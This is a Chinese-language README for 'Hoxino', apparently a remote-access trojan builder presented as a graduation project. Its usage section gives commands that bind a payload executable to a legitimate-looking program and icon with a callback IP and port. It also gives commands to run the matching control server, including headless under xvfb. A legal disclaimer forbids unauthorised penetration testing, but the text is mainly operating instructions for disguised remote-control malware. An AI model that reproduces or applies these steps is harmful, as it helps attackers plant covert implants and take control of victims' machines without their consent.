# Hoxino 项目

## 功能简介

Hoxino 是一款用于远程控制与负载管理的 Python 工具，支持构建与控制两大核心功能。

## 环境准备

- Python 3.6+
- 安装所需依赖：
  ```bash
  pip install -r requirements.txt
  ```
- 请按照本 `README.md` 中的说明自行搭建 Python 环境。

## 使用示例

### 1. 构建负载

```bash
python Hoxino.py build \
  -ip <服务端IP> \
  -p <服务端端口> \
  -i <程序图标> \
  -m <Application/程序本体.exe> \
  -n <负载名称.exe>
```

示例：
```bash
python Hoxino.py build -ip 192.168.1.10 -p 8080 -i icon.ico -m Application/app.exe -n payload.exe
```

### 2. 启动控制服务

```bash
python Hoxino.py control -ip 0.0.0.0 -p 8888
```

### 3. 在无头环境下运行

若在 Linux 无头（headless）环境下，可使用 `xvfb-run`：

```bash
xvfb-run -s "-screen 0 1024x768x24" python3 Hoxino.py control -ip 0.0.0.0 -p 8888
```

## 命令参考

更多可用指令及参数说明，请查阅项目根目录下的 `命令大全.txt` 并自行研究。

## 警告与法律声明

- 本项目涉及敏感操作，仅供技术研究与测试。
- 严禁未经他人允许进行渗透测试。多次强调：
  > 严禁未经他人允许进行渗透测试。
- 请务必在符合法律法规的前提下使用与测试。

## 毕业设计说明

该项目为作者的毕业设计，已上传至 Arch 平台。

---

> *提示：如需更多帮助，请根据项目结构及文档自行探索。*
